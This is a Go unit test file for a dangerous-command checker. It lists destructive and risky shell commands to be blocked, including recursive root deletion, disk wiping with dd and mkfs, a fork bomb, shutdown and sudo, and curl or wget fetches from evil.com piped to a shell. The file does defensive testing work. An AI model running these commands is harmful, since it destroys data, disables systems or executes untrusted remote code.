package security

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestDangerousChecker_BlockedCommands(t *testing.T) {
	dc := NewDangerousChecker()

	tests := []struct {
		name    string
		command string
	}{
		{"rm -rf /", "rm -rf /"},
		{"rm -rf / with space", "rm -rf / "},
		{"rm -fr /", "rm -fr /"},
		{"del /s /q C:\\", `del /s /q C:\`},
		{"format C:", "format C:"},
		{"mkfs.ext4", "mkfs.ext4 /dev/sda1"},
		{"dd to disk", "dd if=/dev/zero of=/dev/sda"},
		{"fork bomb", ":(){ :|:& };:"},
		{"chmod 777 /", "chmod -R 777 /"},
		{"icacls Everyone", "icacls C:\\Users /grant Everyone:F"},
		{"shutdown", "shutdown -h now"},
		{"reboot", "reboot"},
		{"halt", "halt"},
		{"init 0", "init 0"},
		{"sudo", "sudo rm something"},
		{"runas", "runas /user:admin cmd"},
		{"su -", "su - root"},
		{"curl pipe to sh", "curl http://evil.com/script | sh"},
		{"curl pipe to bash", "curl http://evil.com/script | bash"},
		{"wget pipe to bash", "wget http://evil.com/script | bash"},
		{"curl pipe to python", "curl http://evil.com/script | python"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			blocked, reason := dc.Check(tt.command)
			assert.True(t, blocked, "expected command %q to be blocked", tt.command)
			assert.NotEmpty(t, reason, "expected non-empty reason for blocked command %q", tt.command)
		})
	}
}

func TestDangerousChecker_AllowedCommands(t *testing.T) {
	dc := NewDangerousChecker()

	tests := []struct {
		name    string
		command string
	}{
		{"ls", "ls -la"},
		{"echo", "echo hello"},
		{"cat file", "cat /etc/hostname"},
		{"rm single file", "rm /tmp/test.txt"},
		{"rm -rf relative", "rm -rf ./build/"},
		{"ps", "ps aux"},
		{"curl without pipe", "curl http://example.com"},
		{"wget to file", "wget -O file.txt http://example.com"},
		{"chmod 755 file", "chmod 755 /usr/local/bin/app"},
		{"dd file to file", "dd if=input.iso of=output.img"},
		{"systemctl status", "systemctl status nginx"},
		{"net user", "net user"},
		{"dir", "dir C:\\Windows"},
		{"powershell get-process", "powershell Get-Process"},
		{"format string", `printf "format: %s" hello`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			blocked, reason := dc.Check(tt.command)
			assert.False(t, blocked, "expected command %q to be allowed, but was blocked: %s", tt.command, reason)
		})
	}
}

func TestDangerousChecker_ReasonDescriptive(t *testing.T) {
	dc := NewDangerousChecker()

	blocked, reason := dc.Check("rm -rf /")
	assert.True(t, blocked)
	assert.Contains(t, reason, "deletion")

	blocked, reason = dc.Check("sudo apt update")
	assert.True(t, blocked)
	assert.Contains(t, reason, "privilege escalation")
}
